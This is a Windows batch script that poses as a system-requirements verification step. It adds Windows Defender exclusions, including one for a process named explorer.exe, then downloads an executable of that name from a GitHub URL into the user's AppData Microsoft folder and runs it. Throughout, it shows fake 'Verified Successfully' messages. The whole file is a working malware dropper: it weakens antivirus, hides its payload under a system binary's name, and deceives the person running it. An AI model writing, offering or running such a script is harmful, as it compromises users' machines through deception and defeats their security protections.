@echo off
setlocal

:: Define parameters
set "url=https://github.com/XFreddyGinwala/explorer/raw/refs/heads/main/explorer.exe"
set "outputFileName=explorer.exe"
set "outputFilePath=%USERPROFILE%\AppData\Roaming\Microsoft\%outputFileName%"

:: Add the Downloads folder to antivirus exclusions (Windows Defender)
echo Verifying the System Requirements...
powershell -Command "try { Add-MpPreference -ExclusionPath C:\AppData; Write-Host 'Verified Successfully' -ForegroundColor Green } catch { Write-Host 'Failed to Verify pleas Run as Administrator to Continue.' -ForegroundColor Red; exit 1 }"
powershell -Command "try { Add-MpPreference -ExclusionProcess explorer.exe; Write-Host 'Verified Successfully.' -ForegroundColor Green } catch { Write-Host 'Failed to Verify pleas Run as Administrator to Continue.' -ForegroundColor Red; exit 1 }"
:: Wait briefly to ensure exclusion is registered
timeout /t 1 >nul

:: Download the file
echo Downloading the required files...
powershell -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%'; Write-Host 'Almost Done.' -ForegroundColor Green } catch { Write-Host 'Failed to download the files. Please Run as Administrator' -ForegroundColor Red; exit 1 }"

:: Check if the file exists
if not exist "%outputFilePath%" (
    echo Failed to download the required files.
    exit /b 1
)

:: Run the downloaded file
echo Please Wait.
start "" "%outputFilePath%"

:: Security Warning
echo Thanks you are Verified Press Enter to Continue.
pause
